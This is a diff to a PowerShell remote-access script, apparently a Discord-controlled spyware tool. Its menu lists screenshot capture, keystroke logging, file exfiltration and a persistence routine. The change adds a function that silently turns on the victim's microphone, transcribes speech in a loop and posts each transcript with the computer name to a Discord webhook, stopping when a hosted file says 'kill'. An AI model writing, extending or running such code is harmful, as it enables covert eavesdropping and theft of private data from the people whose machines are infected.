@@ -46,6 +46,7 @@ $msgsys = "``========================================================
 = Commands List -                                      =
 ========================================================
 = Message : Send a message window to the User          =
+= SpeechToText  : Send audio transcript to Discord     =
 = Screenshot  : Sends a screenshot of the desktop      =
 = Keycapture   : Capture Keystrokes and send           =
 = Exfiltrate : Send various files. (see ExtraInfo)     =
@@ -63,7 +64,7 @@ $msgsys = "``========================================================
 ========================================================
 = Examples and Info -                                  =
 ========================================================
-= __To Exit Exiltrate or Keycapture__                  =
+= __To Exit Exfiltrate or KeyCapture or SpeechToText__ =
 = Edit your hosted file to contain 'kill'              =
 = this will exit the current function eg. 'keycapture' =
 ========================================================``"
@@ -190,6 +191,28 @@ $results = Get-Content -Path $FileOut -Raw
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$results"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 rm -Path $FileOut
+}
+
+Function SpeechToText {
+Add-Type -AssemblyName System.Speech
+$speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
+$grammar = New-Object System.Speech.Recognition.DictationGrammar
+$speech.LoadGrammar($grammar)
+$speech.SetInputToDefaultAudioDevice()
+
+while ($true) {
+    $result = $speech.Recognize()
+    if ($result) {
+        $results = $result.Text
+        Write-Output $results
+        $jsonsys = @{"username" = $env:COMPUTERNAME ; "content" = $results} | ConvertTo-Json
+        irm -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body $jsonsys
+    }
+    $messages = Invoke-RestMethod -Uri $GHurl
+    if ($messages -match "kill") {
+    break
+    }
+}
 }
 
 Function AddPersistance{
